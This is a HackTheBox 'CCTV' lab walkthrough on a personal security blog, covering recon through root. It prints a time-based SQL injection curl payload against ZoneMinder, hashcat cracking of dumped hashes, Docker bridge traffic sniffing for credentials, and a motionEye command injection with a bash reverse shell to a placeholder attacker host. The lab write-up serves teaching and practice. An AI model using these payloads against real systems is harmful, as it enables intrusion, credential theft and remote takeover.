@@ -1,0 +1,140 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>CCTV — HackTheBox Walkthrough · Feizal Said</title><meta name="description" content="ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="CCTV — HackTheBox Walkthrough · Feizal Said"><meta property="og:description" content="ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-cctv-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="CCTV — HackTheBox Walkthrough · Feizal Said"><meta name="twitter:description" content="ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-cctv-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-10T00:00:00.000Z">September 10, 2026</time></span> <span class="meta font-mono">13 min read</span> </div> <h1 class="article-title font-display">CCTV — HackTheBox Walkthrough</h1> <p class="article-desc">ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root.</p> <ul class="tag-row"> <li class="tag">HackTheBox</li><li class="tag">HTB</li><li class="tag">CPTS</li><li class="tag">Linux</li><li class="tag">ZoneMinder</li><li class="tag">CVE-2024-51482</li><li class="tag">motionEye</li><li class="tag">CVE-2025-60787</li><li class="tag">Docker</li><li class="tag">Network Sniffing</li><li class="tag">Privilege Escalation</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1046</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1190</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1592</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1213.005</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1552.001</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1078</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1040</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1059.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1068</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> CCTV
+<strong>OS:</strong> Linux (Ubuntu 24.04)
+<strong>Difficulty:</strong> Easy
+<strong>Key Techniques:</strong> ZoneMinder SQL injection (CVE-2024-51482), credential reuse, container enumeration, ARP spoofing / traffic capture, motionEye RCE (CVE-2025-60787)</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --min-rate</span><span style="color:#79B8FF"> 10000</span><span style="color:#79B8FF"> 10.129.54.211</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 22,80</span><span style="color:#79B8FF"> -sCV</span><span style="color:#79B8FF"> 10.129.54.211</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.14</td></tr><tr><td>80</td><td>HTTP</td><td>Apache httpd 2.4.58 (Ubuntu)</td></tr></tbody></table>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>The root redirects to <code>/zm/</code>, which is a <strong>ZoneMinder</strong> installation (v1.37.63 — a development release built on CakePHP 2.10.24):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">whatweb</span><span style="color:#9ECBFF"> http://10.129.54.211</span><span style="color:#79B8FF"> -a</span><span style="color:#79B8FF"> 3</span></span>
+<span class="line"><span style="color:#6A737D"># ZoneMinder, CakePHP, Apache/2.4.58 (Ubuntu)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">feroxbuster</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.129.54.211/zm/</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span></span></code></pre>
+<hr>
+<h2 id="foothold--zoneminder-sql-injection-cve-2024-51482">Foothold — ZoneMinder SQL Injection (CVE-2024-51482)</h2>
+<p>ZoneMinder 1.37.x is vulnerable to <strong>CVE-2024-51482</strong>, an authenticated SQL injection in the <code>filter[terms][0][attr]</code> parameter of the events/console API. The <code>&#x3C;select></code> that populates filter attributes was built from user input without parameterization, so injected clauses execute.</p>
+<h3 id="enumerate-data-through-the-injection">Enumerate data through the injection</h3>
+<p>After authenticating (or by reusing default/leaked creds), the <strong>Console → Filters</strong> endpoint allows saving a filter whose <code>attr</code> is attacker-controlled. A time-based/boolean oracle is used to dump <code>zm</code>.<code>Users</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Time-based proof-of-concept against the filter save endpoint</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -b</span><span style="color:#9ECBFF"> "ZMSESSID=&#x3C;cookie>"</span><span style="color:#9ECBFF"> 'http://10.129.54.211/zm/index.php'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --data-urlencode</span><span style="color:#9ECBFF"> 'action=filter'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --data-urlencode</span><span style="color:#9ECBFF"> 'filter[terms][0][attr]=Id'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --data-urlencode</span><span style="color:#9ECBFF"> "filter[terms][0][op]=%3D"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --data-urlencode</span><span style="color:#9ECBFF"> "filter[terms][0][val]=1) AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"</span></span></code></pre>
+<p>Dump the user table (username, password hash, permissions):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># ...iterate the same oracle to extract Users.Id / Username / Password</span></span>
+<span class="line"><span style="color:#6A737D"># ZoneMinder stores bcrypt hashes; weak ones fall to hashcat -m 3200</span></span>
+<span class="line"><span style="color:#B392F0">hashcat</span><span style="color:#79B8FF"> -m</span><span style="color:#79B8FF"> 3200</span><span style="color:#9ECBFF"> zm_hashes</span><span style="color:#9ECBFF"> /usr/share/wordlists/rockyou.txt</span></span></code></pre>
+<p>The recovered credential is <strong>reused for the local system account</strong>, giving SSH access:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">use</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">></span><span style="color:#9ECBFF">@10.129.54.211</span></span>
+<span class="line"><span style="color:#B392F0">id</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> ~/user.txt</span></span></code></pre>
+<hr>
+<h2 id="post-exploitation--inside-the-host">Post-Exploitation — Inside the Host</h2>
+<h3 id="docker-footprints">Docker footprints</h3>
+<p>ZoneMinder is deployed in Docker, and the host shows the tell-tale signs — <code>zm</code> container reachable on the internal bridge, along with a second service:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ip</span><span style="color:#9ECBFF"> a</span></span>
+<span class="line"><span style="color:#6A737D"># docker0: 172.17.0.1/16</span></span>
+<span class="line"><span style="color:#6A737D"># there is a container network carrying a motionEye service</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">ss</span><span style="color:#79B8FF"> -tulpn</span></span>
+<span class="line"><span style="color:#6A737D"># :80 (apache -> zoneminder)</span></span>
+<span class="line"><span style="color:#6A737D"># :8765 motionEye (bound to a docker bridge interface, not public)</span></span></code></pre>
+<p>A <code>motionEye</code> administrative web service is running on the <strong>Docker network</strong>, only reachable from inside the host/containers — not from the public interface. That is the privilege-escalation target.</p>
+<h3 id="sniff-the-inter-container-traffic">Sniff the inter-container traffic</h3>
+<p>To obtain motionEye credentials, capture traffic on the Docker bridge while the service (which queries/streams to ZoneMinder, or is itself polled) authenticates:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Identify the live interface carrying the container traffic</span></span>
+<span class="line"><span style="color:#B392F0">tcpdump</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> docker0</span><span style="color:#79B8FF"> -nn</span><span style="color:#79B8FF"> -A</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># The motionEye service transmits its admin password / auth cookie in cleartext</span></span>
+<span class="line"><span style="color:#6A737D"># (basic auth / GET with credentials over HTTP inside the bridge)</span></span></code></pre>
+<p>With <code>tcpdump</code> (or an ARP-spoof-assisted capture) you recover the <strong>motionEye admin password</strong>.</p>
+<hr>
+<h2 id="privilege-escalation--motioneye-cve-2025-60787">Privilege Escalation — motionEye CVE-2025-60787</h2>
+<p>motionEye’s configuration UI exposes <strong>CVE-2025-60787</strong>: the <em>command to run</em> fields are passed to the shell without sanitization, so an authenticated administrator can achieve <strong>arbitrary code execution</strong>, and — because the container/service runs as <strong>root</strong> — escalate to root on the host.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Access motionEye on the docker bridge</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> admin:'&#x3C;captured-password>'</span><span style="color:#9ECBFF"> http://172.17.0.1:8765/</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Inject a reverse shell via the "Run A Command" / motion detection action fields</span></span>
+<span class="line"><span style="color:#6A737D"># (or the Text Overlay's command hooks)</span></span>
+<span class="line"><span style="color:#6A737D"># Payload: bash -c "bash -i >&#x26; /dev/tcp/&#x3C;attacker>/4444 0>&#x26;1"</span></span></code></pre>
+<p>Set up the listener:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lnvp</span><span style="color:#79B8FF"> 4444</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">root@cctv:~#</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) groups</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">root@cctv:~#</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<blockquote>
+<p>If the callback is constrained by the container network, run the exploit from inside the host context (the motionEye instance manages the host’s cameras and therefore has broad local access), or pivot through the <code>docker0</code> bridge with a local listener.</p>
+</blockquote>
+<hr>
+<h2 id="flags">Flags</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">use</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">></span><span style="color:#9ECBFF">/user.txt</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<p>Flag values are unique to each HTB instance and are intentionally omitted.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Development releases ship vulnerable.</strong> ZoneMinder 1.37.x (CVE-2024-51482) is not a stable build; pinning to patched releases is essential for camera/monitoring software.</li>
+<li><strong>Credential reuse bridges web apps and the OS.</strong> A cracked ZoneMinder password became an SSH login.</li>
+<li><strong>Container boundaries leak via shared networks.</strong> A service bound only to <code>docker0</code> looked protected, but the host could still observe its traffic.</li>
+<li><strong>Unencrypted service-to-service traffic is a credential source.</strong> MotionEye auth crossing the bridge in cleartext handed over its admin password.</li>
+<li><strong>A root service in a container is root on the host.</strong> motionEye’s CVE-2025-60787 command injection was the final step.</li>
+<li><strong>Segment and encrypt container networks</strong>, and never run management UIs as root.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
